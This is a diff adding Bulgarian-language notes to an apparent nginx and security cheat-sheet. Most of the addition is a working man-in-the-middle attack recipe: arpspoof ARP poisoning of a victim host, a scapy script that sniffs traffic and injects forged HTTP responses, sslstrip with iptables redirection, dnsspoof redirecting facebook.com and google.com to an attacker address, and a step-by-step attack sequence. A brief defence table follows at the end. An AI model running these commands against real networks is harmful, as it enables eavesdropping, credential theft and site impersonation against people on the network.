@@ -53,3 +53,126 @@ server {
 ## Импортиране на клиентския сертификат във браузъра ##
 openssl pkcs12 -export -out client.pfx -inkey /etc/nginx/ssl/client.key -in /etc/nginx/ssl/client.crt
 # импортирай client.pfx в браузъра
+
+
+###########################
+###***  IP Spoofing  ***###
+###########################
+
+arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1
+използва инструмента arpspoof (от пакета dsniff) за извършване на ARP spoofing атака. Тя позволява "man-in-the-middle" (MITM) атака в локалната мрежа.
+
+Обяснение на параметрите:
+-i eth0 – Използва интерфейса eth0 за атаката.
+-t 192.168.1.100 – Целевото устройство (жертвата), чийто ARP кеш ще бъде отровен.
+-r 192.168.1.1 – Роутерът (шлюзът), към който жертвата трябва да вярва, че говори директно с вас.
+
+Как работи атаката?
+ARP Cache Poisoning:
+Вашата машина изпраща фалшиви ARP отговори към 192.168.1.100, убеждавайки я, че вашият MAC адрес е на 192.168.1.1 (роутера).
+Също така изпраща фалшиви ARP отговори към 192.168.1.1, убеждавайки го, че вашият MAC адрес е на 192.168.1.100.
+
+Man-in-the-Middle (MITM):
+Цялата комуникация между жертвата и роутера преминава през вашата машина.
+Можете да прослушвате трафика (с tcpdump), да го променяте или да спирате (DoS).
+Допълнителни стъпки за MITM:
+Активирайте IP форуърдинг (за да не спирате трафика):
+echo 1 > /proc/sys/net/ipv4/ip_forward
+Прослушвайте трафика с tcpdump:
+tcpdump -i eth0 host 192.168.1.100
+Спиране на атаката:
+Натиснете Ctrl+C в терминала, където работи arpspoof.
+
+
+## Генериране на отговор ##
+pip install scapy
+
+[spoof_tcp.py]
+from scapy.all import *
+
+VICTIM_IP = "192.168.1.100"  # Жертвата
+TARGET_PORT = 80             # Пример: HTTP заявки
+FAKE_RESPONSE = "HTTP/1.1 200 OK\r\nContent-Length: 13\r\n\r\nHello, World!"
+
+def process_packet(packet):
+    if packet.haslayer(TCP) and packet.haslayer(Raw):
+        src_ip = packet[IP].src
+        dst_ip = packet[IP].dst
+        sport = packet[TCP].sport
+        dport = packet[TCP].dport
+        payload = packet[Raw].load.decode(errors="ignore")
+
+        print(f"[+] Captured packet: {src_ip}:{sport} -> {dst_ip}:{dport}")
+        print(f"    Data: {payload[:100]}")
+
+        # Проверяваме дали е HTTP заявка (GET)
+        if "GET" in payload and dport == TARGET_PORT:
+            print("[*] Injecting fake response!")
+
+            # Създаваме фалшив TCP пакет
+            fake_response = IP(src=dst_ip, dst=src_ip) / \
+                            TCP(sport=dport, dport=sport, seq=packet[TCP].ack, ack=packet[TCP].seq + len(payload), flags="PA") / \
+                            FAKE_RESPONSE
+
+            send(fake_response, verbose=False)
+
+# Подслушваме трафика и обработваме заявките
+print("[*] Sniffing TCP packets...")
+sniff(filter=f"tcp and host {VICTIM_IP}", prn=process_packet, store=False)
+
+sudo python3 spoof_tcp.py
+
+## SSL Strip ##
+sudo apt update
+sudo apt install python3-pip
+pip3 install sslstrip
+
+Тази команда пренасочва целия HTTP трафик към порт 8080.
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+sslstrip -l 8080
+
+
+## dnsspoof ##
+sudo apt install dsniff
+[spoof_hosts]
+192.168.1.200 facebook.com
+192.168.1.200 google.com
+
+sudo dnsspoof -i eth0 -f spoof_hosts
+
+2.3. Пренасочване на DNS трафика
+Ако клиента използва Google DNS (8.8.8.8) или някакъв друг публичен DNS, трябва да пренасочиш DNS заявките през твоята машина:
+iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
+
+## Последователност ##
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1
+
+sudo dnsspoof -i eth0 -f spoof_hosts
+
+sslstrip -l 8080
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+######################
+###***  Защита  ***###
+######################
+
+# статичен MAC
+sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF
+
+arp -a  # търсим дублирани MAC
+
+# защита
+sudo apt install arpon
+sudo arpon -d -i eth0
+
+ip route show  # търсим съмнителен ip за рутера
+
+ARP Spoofing	Статични ARP записи / VPN / Arpon
+DNS Spoofing	DNS-over-TLS (1.1.1.1) / Cloudflare DNS
+SSLStrip	    HSTS / HTTPS Everywhere
+MITM атаки	    Wireshark / Проверка на шлюза
